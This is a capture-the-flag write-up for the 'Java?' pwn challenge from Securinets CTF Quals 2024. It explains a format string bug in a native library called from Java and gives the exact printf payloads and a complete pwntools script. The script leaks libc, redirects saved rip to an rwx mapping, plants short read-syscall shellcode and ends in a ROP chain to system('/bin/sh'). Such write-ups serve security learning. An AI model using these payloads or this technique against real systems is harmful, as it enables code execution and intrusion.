+++ 
draft = false
date = 2024-10-21T10:02:00+02:00
title = "Java? - Securinets CTF Quals 2024"
description = "Hacking Java using a format string bug"
slug = ""
authors = ["bitfriends"]
tags = ["linux","java","format-strings"]
categories = ["ctf"]
externalLink = ""
series = []
+++

Last week we qualified for securinets finals. Java? was a pwn challenge I blooded.
We were given a java program, which reads input three times and passes it to a library:
```java
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class Main {

   private String first = "";
   private String second = "";
   private String last = "";

   static {
      System.loadLibrary("Lib");
   }

   public native void Kabom();
   public native void Setup();

   public static void main(String[] args) throws IOException{
      BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
      Main me = new Main();

      me.Setup();

      //System.out.println("If I give you a gift, will you give me the right input? ");
      //me.Gift();

      System.out.println("And I'll give you 3 bullets");

      System.out.println("First shot: ");
      me.first = reader.readLine();

      System.out.println("Second shot: ");
      me.second = reader.readLine();

      System.out.println("Last shot: ");
      me.last = reader.readLine();

      me.Kabom();
   }
}
```
The library provided prints the three inputs with `printf`, resulting in a format string vuln.
```c
strncpy(dest, v11, 0x1DuLL);
*(_WORD *)&dest[strlen(dest)] = 46;
printf(dest);
memset(dest, 0, 0x3CuLL);
strncpy(dest, v12, 0x10uLL);
*(_WORD *)&dest[strlen(dest)] = 46;
printf(dest);
memset(dest, 0, 0x3CuLL);
strncpy(dest, v13, 0x1CuLL);
*(_WORD *)&dest[strlen(dest)] = 46;
printf(dest):
```
We get three "shots", however they are all printed at the same time and heavily restricted in size.
I noticed that the stack randomization was pretty odd, since the lower 2 bytes weren't randomized at all.

To our advantage, we had pointers on the stack, that in turn pointed to other stack pointers.
Given that, we can write to those pointers to create references to the saved rip, which I managed
to do within the first `printf`. That way we can write to them in later `printf`s to get rip control.
```py
p.sendlineafter(b"shot:", b"%88c%22$hhn%4c%32$hhn|%228$p|")
```
This allows us to get a libc leak as well, which will be important for later.

As already said, the next step is to overwrite the saved return address. Interestingly enough,
there is a `rwx` memory mapping at `0x800000000` in the address space of the java program.

It isn't affected by aslr, plus there are some pointers to it on the stack. So I figured it'd
be a nice target to overwrite rip with. The following line writes `0x800000000` into saved rip:
```py
p.sendlineafter(b"shot:", b"%28$n%8c%32$n")
```
Again, a perfect fit! We still got a last write tho, so now is the time to write the shellcode.
The address `0x800000000` is on the stack (because we wrote it before), as well as `0x800000002`.

So we can write two bytes (or three into the second one) into each address to get 4 to 5 bytes of shellcode.
The following 5-byte shellcode seems to do the job:
```
pop rdi
pop rdx
syscall 
ret
```
-   `rdi` will contain `0`, which is the `fd` for `read` syscall
-   `rdx` will contain a large value, allowing us to read many bytes of data


To our luck, `rax` is `0` (syscall number for `read`), and `rsi` points to the stack before saved rip!
After writing the shellcode, it is immedeately executed and we can read a bunch of data and overwrite ret.
Using the libc leak we got in the first step, we can call `system("/bin/sh")`:
```py
from pwn import *

p = process(["./run.sh"])

p.sendlineafter(b"shot:", b"%88c%22$hhn%4c%32$hhn|%228$p|")
p.sendlineafter(b"shot:", b"%28$n%8c%32$n")
p.sendlineafter(b"shot:", b"%23135c%29$n%12757680c%165$n")

p.recvuntil(b"|")
libc_leak = int(p.recvuntil(b"|")[:-1], 16)
libc_base = libc_leak - 0x947d0
system = libc_base + 0x50d70
binsh = libc_base + 0x1d8698
pop_rdi = libc_base + 0x2a3e5
ret = libc_base + 0x29139

p.sendline(p64(ret)*0x500 + p64(pop_rdi) + p64(binsh) + p64(system))

p.interactive()
```